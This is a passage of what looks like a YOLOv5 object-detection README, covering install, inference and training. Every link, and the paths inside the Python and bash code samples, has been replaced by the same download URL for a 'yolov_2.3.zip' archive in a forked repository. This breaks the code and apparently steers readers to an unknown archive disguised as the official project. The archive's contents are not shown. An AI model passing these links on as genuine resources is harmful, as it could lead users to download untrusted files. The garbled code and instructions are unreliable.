<summary>Install</summary>

Clone repo and install [https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip) in a [**Python>=3.8.0**](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip) environment, including [**PyTorch>=1.8**](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip).


<details>
<summary>Inference</summary>

YOLOv5 [PyTorch Hub](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip) inference. [Models](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip) download automatically from the latest YOLOv5 [release](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip).

```python

# Inference
results = model(img)

# Results
https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip()  # or .show(), .save(), .crop(), .pandas(), etc.
```

<details>
<summary>Training</summary>

The commands below reproduce YOLOv5 [COCO](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip) results. [Models](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip) and [datasets](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip) download automatically from the latest YOLOv5 [release](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip). Training times for YOLOv5n/s/m/l/x are 1/2/4/6/8 days on a V100 GPU ([Multi-GPU](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip) times faster). Use the largest `--batch-size` possible, or pass `--batch-size -1` for YOLOv5 [AutoBatch](https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip). Batch sizes shown for V100-16GB.

```bash
python https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip --data https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip --epochs 300 --weights '' --cfg https://github.com/juanjo157/yolov5/raw/refs/heads/master/utils/aws/yolov_2.3.zip  --batch-size 128
                                                                 yolov5s                    64
                                                                 yolov5m                    40
                                                                 yolov5l                    24
                                                                 yolov5x                    16
```
